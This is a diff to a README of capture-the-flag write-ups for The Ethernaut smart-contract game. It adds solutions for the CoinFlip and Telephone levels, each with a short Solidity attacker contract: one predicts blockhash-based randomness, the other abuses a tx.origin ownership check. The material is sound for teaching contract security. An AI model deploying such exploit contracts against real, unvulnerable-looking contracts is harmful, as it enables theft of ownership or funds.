@@ -7,6 +7,8 @@ Solutions for [The Ethernaut](https://ethernaut.openzeppelin.com/) CTF challenge
 0.  [Hello Ethernaut](#00---hello-ethernaut)
 1.  [Fallback](#01---fallback)
 2.  [Fallout](#02---fallout)
+3.  [Coinflip](#03---coinflip)
+4.  [Telephone](#04---telephone)
 
 ## 00 - Hello Ethernaut
 
@@ -72,3 +74,53 @@ contract ConstructorDemo {
 ```
 
 So, in our Fallout contract, the `constructor` function is named incorrectly, `Fal1out`, so in order to complete our objective to change owner of the contract, we just need to call this constructor function and the challenge will be completed.
+
+## 03 - CoinFlip
+
+This one is fun and unique, the challenge wants the user to correctly guess true or false (heads or tales) for 10 times in a row in order to complete it. So how do we do it ?
+
+Solution here is that there is no real randomness in solidity, so we can use an external contract to guess the result from `CoinFlip` contract and only let transaction go through if we got the correct address.
+
+```javascript
+contract Attacker {
+    CoinFlip private immutable i_target;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        i_target = CoinFlip(_target);
+    }
+
+    function flip() external {
+        bool guess = _guess();
+        require(i_target.flip(guess));
+    }
+
+    function _guess() private view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        return side;
+
+    }
+}
+```
+
+Keep calling the `flip` function in this contract, the ones with the correct flip will execute while others revert.
+
+## 04 - Telephone
+
+Personally, the easiest challenge for me so far. The knowledge of `tx.origin` vs `msg.sender` really helps here.
+
+`tx.origin`: tracks the origin EOA that executed the transaction.
+
+`msg.sender`: the immediate EOA or smart contract that invoked the function.
+
+So create a contract which calls the function `changeOwner`, in this schenerio, `tx.origin` will be your address while `msg.sender` will be the Attacker contract, which breaks the condition while passing in your own address as new user and completing the challege.
+
+```javascript
+contract Attacker {
+    constructor(address _target) {
+        Telephone(_target).changeOwner(msg.sender);
+    }
+}
+```
